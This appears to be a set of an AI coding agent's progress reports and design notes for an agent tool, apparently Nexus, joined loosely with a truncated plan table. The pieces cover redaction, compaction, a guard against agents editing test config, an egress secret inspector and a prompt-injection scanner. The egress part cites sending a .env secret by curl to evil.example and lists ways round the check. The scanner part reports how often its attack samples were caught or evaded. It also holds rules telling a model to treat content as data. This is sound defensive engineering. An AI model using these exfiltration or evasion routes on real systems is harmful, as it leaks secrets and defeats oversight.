**What it does.** `scripts/flake_report.mjs` reads the CI workflow's last 20 runs through the GitHub API and finds runs whose earlier attempt failed and whose final attempt passed. It names the failing tests from the earlier attempts' job logs and fails when a test needed a rerun in 2 of the 20 runs. A weekly workflow runs it with read-only permissions and uploads the JSON report as an artifact. A report that can't be built exits 2 and is never shown as "within budget".

**Checks.**
- 13/13 tests pass locally, including the leak ratchet.
- I ran it against this repo's real CI history: 20 runs examined, 0 reruns, exit 0.
- The log parser was checked against three real failed-run logs from earlier today. It returned exactly the failing tests I had found by hand, and a trimmed real log is committed as a fixture.

**A limit you should know about.** This repo fixes red CI by pushing a new commit, not by re-running, so the report only sees manual re-runs. Today's flaky sidecar test was fixed by a commit and would not show up here. The PR description says so. If you want pushed fixes tracked too, that needs a different mechanism, such as matching failing test names across consecutive runs. I haven't built it.

Main CI on `6df4e6c9` (the RD-4/DH-3 merge) is still in progress.

I've pushed a fix for the CodeQL alert to #576, so its head is now `f28beb79`. I have not confirmed CodeQL has cleared; I've started a watch on the three required checks plus CodeQL at that head.

**The alert.** CodeQL's high-severity "incomplete string escaping" finding was real. `renderMarkdown` in `scripts/flake_report.mjs` escaped `|` in test names but not backslashes. A name ending in a backslash would cancel the escape and break out of its table cell.

**The test.** It uses names containing a trailing backslash, a pipe and a newline, and requires every table row to keep exactly its three cells. I temporarily removed the backslash escaping to confirm the test catches it: 7 pass and 1 fail on the old behaviour, 8/8 pass on the fix. I restored the fix and confirmed the file matches.

I also searched for the same pattern elsewhere. The other `replace` calls either escape backslashes already or are shell or regex quoting where that isn't the risk. I did not query the repository's code-scanning alert list successfully (the call returned nothing), so I'm relying on CodeQL's own result for this PR.

MT-3 is open as PR #577 at head `06ae52a4`, and its required checks are running. I'll merge at that exact head only if all three succeed. This delivers the plan's acceptance for MT-3, one redaction table with a parity test; I deliberately did not do the "collapse the 17 variants" part.

**What changed**
- A single table, `cli/src/redaction_patterns.json`, now holds the shared secret patterns, and the TypeScript redactor is built from it.
- The Rust sidecar-stderr redactor keeps its own patterns, because Rust can't read the JSON at build time without coupling the crate to `cli/`. A Rust unit test runs the shared corpus through it.
- `cli/test/redaction_parity.test.ts` compares the table to the Rust patterns, including flags, replacements and order, and it fails if it can't parse every pattern in the Rust block. I confirmed it fails on drift by editing the real files: a Rust-only edit failed it, and so did an extra table-only rule. Both files are restored.
- The shared corpus stores vendor-prefixed tokens split by an empty marker, so no key-shaped literal is committed.

**Evidence that behaviour is unchanged:** the old and new TypeScript redactors agreed on 20,000 generated inputs, 11,503 of which were actually redacted. The redaction, diagnostic and terminal-safety test files pass 155/155. `cargo clippy --all-targets -D warnings` is clean. I also exported the commit with `git archive` and ran the parity test there, since an untracked fixture burned me on the last PR.

**Two things I want you to know**
- **The collapse isn't done.** The plan also says to collapse the 17 `redact*` and 4 terminal-safe helpers. They turned out to be layered, not duplicates: `safeTerminal` is `visibleControls` over `redactSecrets`, and the classifier and persistence redactors do different jobs. Merging security code blindly seemed riskier than the duplication, so I left them and said so in the PR description.
- **`cargo fmt` isn't clean in this crate.** The hundreds of diffs are in files I never touched, and CI doesn't run `cargo fmt`, so I didn't reformat anything.

CS-2 is implemented and not yet committed. The new tests and the existing verification-guard suite pass 57/57, and a wider regression run over every test touching the tool bridge or security manager is going in the background. The guard only changes behaviour in the opt-in `block` mode, per the owner's recorded decision D2 that the default modes stay record-only. The default modes behave as before.

- **Detection:** it compares verification files by contents before and after each `run_command`, so it doesn't need to recognise the command. A script that rewrites `package.json` scripts through `node -e` is caught, which the old command parsing would not see.
- **On a change:** it restores the file, refuses the call as `VERIFICATION_CONFIG_PROTECTED` with the changed lines, and records the attempt as blocked. The acceptance case works: `sed -i` on a Makefile is reverted and refused with a diff.
- **What stays free:** a new runnable test file can still be created, and a dependency bump in `package.json` is not a change; only the keys that decide how tests run count.
- **Other modes** (`approve`, `record`, `off`) let the same `sed -i` through and revert nothing, which the tests pin.
- **Limits, stated in the docs:**
  - The scan covers up to 20,000 workspace entries.
  - Files over 2 MiB are only fingerprinted, and files over 64 KiB can't be restored.
  - If a limit is hit, the result says coverage was partial.

Two of my own test assumptions were wrong and I fixed them. I had expected a non-zero exit to come back as `success: false`, but `run_command` reports the exit code in its output. I now compare a no-op command's result with the guard on against the same command with it off.

result.output:
### Compaction

Automatic compaction runs when a request would not fit, or proactively at 80% pressure. If two pressure compactions
in a row each free less than 5% of the window (or find nothing to remove), Nexus stops compacting on pressure alone
and waits until a request would not fit. This *compaction thrash* is recorded separately from task repetition.

`/compact` and `/compact --llm`:

- **No turn running**: runs at once.
- **During work (TUI)**: queued and acknowledged at once. It runs only when nothing is in flight: after the current
  inference and its whole tool batch, approvals included, have settled, and before the next inference or tool
  dispatch. If the turn ends first, it runs at the end of the turn.
- **Duplicates**: a second identical request shares the first one's outcome. At most one request of each kind waits.
- **Cancellation and shutdown**: end waiting requests with that outcome.
- **Every request** gets a final result for its id.

Every compaction, automatic or manual, is committed in a fixed order before anything else happens:

1. the original messages are appended to the archive (`<session>.history.jsonl`, fsync), tagged with the compaction id;
2. the conversation switches to the compacted form;
3. the task state is written, then the session record. Each names the compactions it commits, and each is synced to
   disk.

If the archive cannot be written, nothing is compacted and the outcome says so. If a record cannot be written, the
compaction is applied but reported **not durable**, naming which write failed:

- an automatic compaction stops the turn with `PERSISTENCE_FAILED`, before any further inference or tool call;
- a manual one reports failure.

Mid-turn progress saves that fail are shown once and listed on the turn's result (`persistence.failures`).

After a crash at any point of a compaction, `/resume` is consistent:

- **Died before the records were written**: the resumed conversation still holds the originals, and the archive lines
  of the interrupted compaction are set aside and reported.
- **Died mid-append**: a torn archive line is counted as unreadable and not used.
- **Records disagree** (the task state names a compaction the session does not): each record is consistent with the
  archive by itself.

Compaction never replays an action. It only rewrites context, and only at a boundary where every tool call has its
recorded result. A call whose result was never recorded keeps the existing "outcome unknown" note.

### Work unit compaction and durability

Work units executed in durable workflows (`/team`, `nexus operation`) have `durable: true` and participate in the same durable compaction contract as depth-0 interactive turns:

content.text:
CX-2 is implemented but not committed or opened as a PR. The 11 new tests pass and the leak ratchet passes 6/6. The existing continuity suite is the open question, and I'm not claiming it's fine yet.

**What it does.** Each compaction now writes a record on its first archive line, as an extra key so older builds read the same file unchanged. The record lists a content-addressed id for every message it covered, a digest over them, where the summary block was inserted and what it was. On resume, every committed compaction is checked against its record.
- **Corrupt archive:** a corrupt one is reported with its covered ids, and its messages are no longer served by `read_archive`.
- **Damaged output:** if the latest compaction's own inserted block is gone from the saved conversation, and every committed compaction verifies with no unreadable or missing lines, resume restores the full transcript from the archive. It also drops those compactions from the committed list so they aren't double-counted later.
- **Conservative cases:** with a damaged archive line, or an archive written without a record by an earlier build, nothing is undone. Both cases are tested.

**Design decision.** The plan describes the compaction state as a separate file. I didn't build one. Adding a new companion file means touching retention, deletion and the typed checkpoint-bundle schema that is persisted in operation state, which is a lot of risk for a medium unit. The record lives inside the existing archive instead.

**The part I haven't verified.** `compaction_continuity.test.ts` (34 tests, which exercises the archive path I changed) was killed by the runner's 300-second per-file watchdog, so it gave no result. It passed 34/34 earlier today on a different branch, so this is either a slow run under load or something my change made hang. I can't tell yet. I've rerun it with a 20-minute limit in the background and will read the actual timings and result before committing anything. If it fails or hangs, I'll treat it as my regression and fix it.

Archives written without a record (earlier builds) resume exactly as before.

Design choice, stated: the plan describes compaction state as a separate file. I did not add one: a new companion file means touching retention, deletion and the typed checkpoint-bundle schema persisted in operation state, which is more risk than a medium unit warrants. The record lives in the existing archive file instead.

Verification: compaction_record (12 tests: id canonicalisation, record contents, truncation at 4,096 ids, audit ok/corrupt/unauditable, full-transcript order, inserted-block detection, and a real-compaction round trip including a tampered archive line, the undo, and the two conservative cases where nothing is undone) plus the leak ratchet 18/18; compaction_continuity 34/34 on this branch and on clean main. That file takes 390 s on this host (516 s on main), above the runner's default 300 s per-file watchdog, so it needs NEXUS_TEST_FILE_TIMEOUT_SECS to run locally; it is not slower on this branch. Redaction safety checked on six real secret shapes: redaction changes each, is idempotent, and equals what the archive stores, so a good summary is never mistaken for a missing one.

content.text:
CX-3 is implemented, with its tests green, and it is not committed yet. One long regression file is still running.

**What it does.** After `/compact --llm` produces a model summary, a second bounded call checks it against the pinned gating requirements before it's used.
- **The call:** one small request carrying at most 40 requirements, each clipped to 400 characters, plus the summary clipped to 6,000 characters. It sends no history and no tools, has a 30-second limit, and tells the model to treat the summary as data and ignore any instructions inside it.
- **A summary the check says dropped a requirement:** rejected.
- **An unverifiable answer:** rejected too, whether it was unreadable, empty, or the call failed.
- **When a summary is rejected:** the deterministic summary is used and the reply says which requirement was missed, or why the summary couldn't be verified. The compaction itself still succeeds.
- **No gating requirements, or plain `/compact`:** no call is made.

**What it can't do.** The probe is a second opinion from a model, not proof. The actual guarantee that no gating requirement leaves the request stays the existing pinned-ledger check, which never asks a model. The docs say so.

**Checks.**
- The 8 new tests pass 8/8. They run the real `--llm` path against a scripted gateway and cover accept, reject-on-missing, an unreadable or empty answer, a failing call, no requirements, and plain `/compact`.
- A mutation disabling the probe made exactly the 3 probe-dependent tests fail (5 pass, 3 fail).
- The four other suites that exercise the `--llm` path pass: `agent_observer` 17/17, `compaction_ledger_invariant` 6/6, `provider_wait_resume` 43/43 and `sidecar_compact_queue` 3/3.
- The CERI scenarios pass (27 pass, 0 fail, 1 skip). The skip is the known pending SI-5 scenario, which belongs to VC-1.
- `compaction_continuity` is running in the background with the longer watchdog (it took 390 s last time); I'll read its totals before opening the PR.

Main CI on `b9f7d6c1` (the CX-2 merge) is still unchecked; `c42f5049` was confirmed green earlier.

## 3. Authority model (decision, not new machinery)

Requirement and invariant authority is the field the ledger already has: operator text is authoritative and immutable by agents; anything an agent proposes is recorded as inferred and never gates. Repository content (docs, comments, config) is evidence, never instruction, unless the operator elevates it with an explicit command.

## 4. Implementation units (dependency order)

Each unit: failing test first, smallest change, no weakened test, rollback = revert the single PR.

| SI-2 | G-SI-2 | Path-class protection for verification config (tests, CI, build/verify scripts): an agent edit is blocked or needs an operator decision; every attempt recorded | Agent edits `Makefile`/test file: blocked, attempt in export; operator-authorised edit passes; no false block on ordinary source | Config flag for the
| SI-3 | G-SI-3 | Steering-conflict record: detect steering that negates a requirement; ask the operator instead of replacing the ledger | Conflicting steer: ledger kept, decision raised; non-conflicting steer unchanged | Revert. ## 5. Measurement and honesty

Baseline = the failing tests added in each unit before its fix. Claims are limited to: detected, enforced (blocks acceptance), verified by named test. CERI results from this repository are internal validation, not independent qualification (F02/F06 remain deferred). No score is introduced.

content.text:
VC-1 and VC-4 are implemented and not yet committed. The new boundary tests pass and the activated CERI scenario passes. A regression run over 56 related test files is running in the background, and I'll read its totals before opening the PR.

**What VC-1 does.** An operator can declare `boundaries` in an operation spec, and the review gate checks each candidate diff against them by deterministic line analysis.
- **Rules.** Import deny and allow lists, protected public files, interface and schema files, and modules that must stay free of import cycles. Every error names its field, and an unknown key is refused.
- **Violations REJECT.** A denied import, a protected file changed outside the authorised scope, and an import cycle are violations. The review gate rejects them even when the verifier passed and the model said ACCEPT.
- **Advisories are information.** An import outside an allow-list, and an interface or schema change that is potentially breaking or can't be classified, are advisories.
- **Coverage is reported on every verdict.** It lists what was analysed and what was skipped. It also says what the method cannot see: path aliases, re-exports, computed imports, multi-line imports, and changes inside a declaration's body. A file header it can't read counts as a violation.
- **No rules means no check.** Existing operations behave exactly as before.
- **A damaged rule block on disk is refused, not skipped.** Skipping it would silently switch the check off.

**VC-4.** `cumulative-change-03` is now active. Two successive changes each pass alone, but together they close an import cycle, and the gate REJECTs the cumulative diff. That leaves no scenario pending. The scenario's expected outcome is unchanged; only its status flipped, and I updated the SHA-256 manifest in the same change, as the file's own note requires.

**Checks so far.**
- **Boundary tests.** 18 rule tests, 7 gate tests and 3 operation tests pass.
- **Existing suites.** `independent_review` passes 14/14 and `review_unit_boundary` 23/23.
- **CERI.** 28/28, with 0 skipped.
- **Mutation testing.** Disabling the rules fails the right tests. My first mutation of the gate was too weak, because a later check also rejects, so I redid it on the whole block. That exposed a test that didn't isolate the boundary path, which I fixed.
- **Refactor.** I moved the diff-path helpers into their own module to avoid a circular import, and confirmed the moved code is byte-identical to the original.

**Scope limit.** The rules apply to reviewer units in `nexus operation run`. A plain `nexus run` task has no review gate, so boundaries don't apply there. The docs say so.

Main CI on `49fa7300` (the CX-3 merge) is unchecked, and `b9f7d6c1` was confirmed green earlier.

content.text:
CS-8 is implemented and not yet committed. The new tests pass 19/19, and a regression run over 80 tool, security and network-related test files is going in the background. I'll read its totals before opening the PR.

**What it does.** Before `fetch_web`, `search_web`, `browser_navigate`, `browser_type`, or a `run_command` line that starts a network command (`curl`, `wget`, `nc`, `ssh`, `scp`, `rsync`) runs, Nexus checks the call for the workspace's own secrets.
- **Checked:** secret-named values from the root `.env` files, as written, URL-encoded or base64-encoded; a `$VAR` the command expands when that variable is set to a secret; and a credential file the command reads (`.env`, `id_rsa`, `.npmrc` and similar).
- **A hit** is refused before anything runs, with `EGRESS_SECRET_BLOCKED`. The message and the record name the secret and where it was found, never the value.
- **Not inspected:** loopback, localhost, private-network and appliance destinations.
- **Policy** is set under `egressInspector` in `.nexus-security.json`: `block` is the default, an invalid value falls back to `block`, never to `off`, and `allowDestinations` exempts named hosts.

**Why it was needed.** Before writing it, I tested the existing egress boundary. It allowed a `.env` password sent to an external host, and `run_command curl …` just ran.

**Checks.**
- The 19 tests cover the plan's acceptance case: a `.env` value sent to an external host is refused and a loopback one isn't.
- A blocked shell command doesn't run at all, not even the part before the `curl`.
- Mutations (value search off, loopback exemption dropped, bridge wiring removed) failed 7, 3 and 3 tests respectively.

**What it can't do, stated in the docs.**
- It can't see a secret the command builds at run time, such as `$(cat .env | base64)`, one split across arguments, or one transformed beyond URL or base64 encoding. It guards against the careless and the common, not a determined adversary inside the shell; containment is the guard for that.
- `.nexus-security.json` lives in the workspace, so a cloned repository can ship one that turns the inspector off. That is the existing trust model for every field in that file, and the docs say so.

**Risk to watch in the regression run.** The check is on by default and sits in front of every `run_command`, which is why I'm running the wide set. Main CI on `930c8bea` (the VC-1 merge) is unchecked.

Gap first: the existing InformationFlowBoundary recognises secrets by shape. Probed on main before writing code: a \`.env\` password sent to \`https://evil.example\` through the egress boundary was allowed (nothing quarantined), and \`run_command curl https://evil.example/...\` simply ran. Loopback/private/appliance addresses already classify as local.

What it does: before \`fetch_web\`, \`search_web\`, \`browser_navigate\`, \`browser_type\`, or a \`run_command\` line that starts a network command (curl, wget, nc, ssh, scp, rsync...) runs, the call is checked for the workspace's own secrets: secret-named values of the root \`.env\`/\`.env.*\` files (templates, placeholders and short values excluded) as written, URL-encoded or base64; a \`\$VAR\` a network command expands when it is set to a secret; a credential file the command reads (\`.env\`, \`id_rsa\`, \`.npmrc\`, \`.netrc\`, \`.aws/credentials\`...). A hit is refused before anything runs (\`EGRESS_SECRET_BLOCKED\`), naming the secret and where it was found, never its value; the decision is recorded (\`getEgressDecisions\`). Local, loopback and private-network destinations are not inspected. Policy \`egressInspector\` in \`.nexus-security.json\`: \`mode\` block (default) / record / off (an invalid value falls back to block, never to off) and \`allowDestinations\` (exact or \`*.suffix\`; a call that names no host cannot be allow-listed).

Limits, in the manual: it cannot see a secret a command builds at run time (\`\$(cat .env | base64)\`, a script the model wrote), one split across arguments, or one transformed beyond URL/base64. It is a guard against the careless and the common, not against a determined adversary in the shell; containment is that guard. And like every field of \`.nexus-security.json\` it is read from the workspace, so a cloned repository can ship its own (the agent itself cannot edit the file).

content.text:
Two separate problems turned up while I waited, and both are being handled.

**1. Main CI on `930c8bea` (the VC-1 merge) failed in `test-matrix (22)`.** It wasn't a code failure. The job died before any tests ran, at `check_deprecated_lock.mjs`, which failed closed with "could not verify typescript@7.0.2: fetch failed", a network error reaching the npm registry. `test-matrix (24)` ran the same check on the same commit and passed. I re-ran only the failed job, and it's on attempt 2 and in progress. That check makes a single 20-second fetch with no retry, so a brief registry blip can turn main red. I plan to add bounded retries while keeping it fail-closed, but I haven't started that, and I'm not calling main green until the re-run finishes.

**2. CodeQL failed on #583 with a high-severity finding in my own code.** It was a polynomial-time regular expression in the egress inspector's host parsing, on input the model controls. I replaced the backtracking patterns with `indexOf`, `new URL` and a label-by-label host check, and capped word length. The `.env` line parser used lazy patterns of the same shape, so I rewrote it with plain string handling too. The 23 tests pass.

I could not reproduce a real slowdown. The old patterns ran in about 1 ms even on 32,000-character inputs, so this was CodeQL being conservative, not a demonstrated denial of service. I added a pathological-input test anyway as a guard, and I'll say that plainly in the PR.

The `.env` parser rewrite exposed one real bug that predates it. A quoted value followed by a comment kept its quote characters. A guard built on exact-value matching would then never match the real secret. It parses correctly now.

#583's head is now `60705bea` and its checks have restarted. I'll merge at that exact head only if all three required checks and CodeQL succeed.

content.text:
CS-7 is built, tested and open as PR #585 (head `d48b40b5`). It is not merged yet. CodeQL is green, and the required `test-matrix (22)`, `test-matrix (24)` and `linux-x86_64` were still pending at my last check. A check is scheduled in about 15 minutes. If they pass, I'll merge at that exact head.

The scanner is a heuristic and the measured numbers are modest. The held-out set (written after I froze the scanner) is the realistic figure:

| Set | Attacks caught | Benign flagged |
|---|---|---|
| Tuned (the phrasings I built it against) | 54 of 64 | 5 of 45 |
| Held-out | 15 of 30 | 2 of 24 |
| Deliberate evasions (paraphrase, other languages, look-alike letters, split words) | 0 of 12 | n/a |

- **Flagged benign samples:** five are security articles and tests that quote an attack phrase, which are expected hits.
- **Corpus authorship:** I wrote the corpus myself, so even the held-out rate is optimistic.
- **Where this is recorded:** the PR, CHANGELOG and User Manual all call it a heuristic and list the limits.
- **Regression:** 451 of 451 tests passed across the agent, tool, security, stream, skills, verification, approval, compaction and request-shape suites. I ran them in the worktree with a throwaway HOME.

**What it does:**
- A suspected result reaches the model with a notice first, wrapped in `<<<UNTRUSTED RESULT BEGIN/END>>>`. Its content is kept; hidden characters are shown as `<U+XXXX>`.
- A new `security.injection_suspected` stream event reports the rule ids only, never the content.
- While an operator is present, the next step's state-changing calls ask for approval even in `--mode auto`. Reads do not. With no operator (headless or `--yes`), nothing is blocked and the label and fence are the whole response, so an autonomous run can't stall on a false positive.
- Nexus's own memory tools are not scanned.

The approval gate test fails when I disable the gate, so it is load-bearing.

After merging, the plan continues with the CS-1 doctor containment report, then MQ-7 slices B and C, PR-1, MT-1 and the native protocol work, then the v1.2.1 RC.

## 1. Code Review (signal true when at least one defect is reported)

Find the defects this Change introduces that its author would want to fix before merging: bugs, regressions, broken invariants, data loss, and missing guards on paths the Change adds or alters.

How to review:
1. Read the repository's review rules: REVIEW.md, AGENTS.md and CLAUDE.md at the repository root and in the directory of each changed file and its parents, as they are at the diff base (`git show <diff base>:<path>`), so the Change cannot rewrite its own review. The nearer file wins on conflict. A finding that rests on a rule quotes the rule and cites its file and line.
2. Read the whole diff, then trace each changed path as a running system: its callers, the changed code, and what it calls. Look in particular for:
   - Sequencing and partial failure: state left inconsistent, orphaned or lost when a later step fails or returns early; writes made before a fallible call; cleanup that runs only on success.
   - Assumptions about external or asynchronous state: how another system behaves, or a value that can change between the check and its use.
   - Composition and concurrency: behaviour under the real callers, retries and concurrent calls. Report a race only with an interleaving those callers can produce.
   - Code that cannot compile or type-check, and logic that is wrong for every input.
3. Keep going after the first defect until you have covered the whole diff.
4. Before you report a candidate, try to disprove it by reading the code: open the code it depends on, find the caller or input that triggers it, and check whether a guard elsewhere already prevents it. Drop it if you cannot show the path from the code.

Inspect with read-only commands (git, rg, reading files). Do not install dependencies or run builds or tests.

Report a defect only when all hold: this Change introduced it (code already like this at the diff base is out of scope, even on a touched line); real impact on correctness, data, security or performance, one discrete fixable issue; you can name the input, state or sequence that triggers it (cite code outside the finding's own lines when the trigger depends on it; never infer from a name alone); not a behaviour change the Trail's title or description says is intended; fixing it asks no more rigor than the surrounding code holds itself to.
Do NOT report: missing tests (unless a review rule requires them), style, naming, formatting, documentation, refactors or alternative designs, anything a linter, type checker or CI already enforces, generated or vendored files, code a review rule or suppression comment explicitly allows, problems under inputs the code never receives, praise. Security hardening without a concrete exploit belongs to the security reviewer.

Writing findings: one per distinct defect (same defect in several places: once, at the changed line that causes it, naming the others); anchor on the changed line that causes it, ranges 10 lines or fewer; body = defect and trigger, impact, the fix; one short paragraph, at most 3 lines of code, matter-of-fact. Severity: high = must fix before merge (breaks a real path for ordinary inputs, loses or exposes data, opens a security hole); medium = real defect needing specific conditions or limited impact; low = real but minor; never overstate. Confidence: 0.9+ when the triggering path was traced in code; 0.7-0.9 strong evidence with one assumption; 0.5-0.7 one condition unconfirmed; never report below 0.5. An earlier finding is "fixed" only when the code at its location changed or the triggering path is gone; a commit elsewhere is not a fix.

## 2. Security Review (signal true when at least one vulnerability is reported)

Review this change for security vulnerabilities it introduces or exposes: missing or bypassable authentication and authorization checks, privilege escalation and cross-tenant access; injection (SQL, shell command, path traversal, template); unsafe deserialization; secrets or credentials in code, logs or errors; insecure defaults; missing validation of untrusted input at a trust boundary; and exposure of data to callers who should not see it.

Trace untrusted input from where it enters to where it is used. Report only issues with a plausible exploit path through the changed code, and state the impact.

Do NOT report: general code quality, style, missing tests, or hardening suggestions without a concrete vulnerability.

## 3. Slop (rate Low / Medium / Large; the rating is the signal; rationale names the two strongest reasons; each concrete slop problem is a finding anchored to the changed code)

Very strict review of agent-generated code slop. Review the net change: the diff from its diff base to its head commit; the final state of the diff is the subject, not commit history or how many pushes it took. Anything already at the diff base is existing code. Always review against the diff base, never the current tip of the base branch.
1. Start with the changed files and the patch; for a large patch read the rest file by file with `git diff <base>..<head> -- <path>`.
2. Read nearby code, repo instructions, and relevant tests to learn how the project works.
3. You may skim the commit log for intent but do not grade individual commits.
Read-only: do not install dependencies; do not run build, typecheck, lint or tests. Judge whether tests prove the new behaviour by reading them with the code they exercise; assertions that do not match the claimed behaviour are themselves the finding. Do not run `entire review`, use other AI agents, or hand off.
Slop = avoidable, low-trust work from not understanding the repo well enough, creating extra bugs, review work or maintenance. Follow every workflow, route, state change and rule touched, start to finish. Rate on severity (how much can it break or burden), prevalence (how much of the change), avoidability (did the repo already have a simpler or established way). Look for: wrong assumptions, broken flows, skipped rules, duplicate systems, weak tests, needless complexity, comment noise (comments restating the next line, narrating what changed and why, explaining what conventions make obvious), leftover debris from iteration (dead code, stale comments, unused helpers, abandoned approaches), work much larger than the result. Be very critical, but do not raise the rating just because the diff is large or has several small issues; do not call necessary complexity slop; do not charge the change for problems it merely sits next to.
- Low: no real slop, or small isolated issues that do not weaken the main implementation.
- Medium: a central wrong assumption, repeated low-trust work, weak checks for important behaviour, or meaningful avoidable rework; fixable without replacing the core.
- Large: widespread slop, wrong or misleading core approach, much should be rewritten or removed.
